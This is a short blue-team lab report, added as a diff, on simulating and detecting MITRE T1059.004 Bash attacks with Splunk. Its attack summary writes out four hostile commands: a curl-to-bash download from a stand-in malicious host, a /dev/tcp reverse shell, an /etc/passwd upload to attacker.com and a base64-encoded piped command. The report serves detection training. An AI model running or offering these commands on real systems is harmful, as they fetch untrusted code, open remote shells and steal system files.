@@ -1,0 +1,41 @@
+🎯 MITRE Technique: T1059.004 – Command and Scripting Interpreter (Bash)
+
+📆 Date: 23/06/2025
+🖥️ Host: ubuntu-vm (192.168.177.x)
+👤 User: lief
+
+🎭 Attack Summary:
+Simulated malicious bash commands:
+
+curl http://malicious.com/script.sh | bash
+
+bash -i >& /dev/tcp/192.168.56.1/4444 0>&1
+
+cat /etc/passwd && curl -X POST -d @/etc/passwd http://attacker.com/loot
+
+echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash
+
+🧠 Impact:
+These commands represent real-world payload delivery, reverse shells, and data exfiltration using Linux interpreters.
+
+🔍 Detection:
+Splunk queries were crafted to identify:
+
+Pipe-based execution (|, &&)
+
+Reverse shell syntax (/dev/tcp)
+
+Base64 encoded payloads
+
+Suspicious usage of curl + bash
+
+🛡️ Outcome:
+All attack commands were successfully detected in .bash_history and syslog, correlated through Splunk.
+
+✅ Recommendation:
+
+Monitor and alert on piped/bash and encoded execution
+
+Limit /dev/tcp access
+
+Harden .bashrc and shell profiles
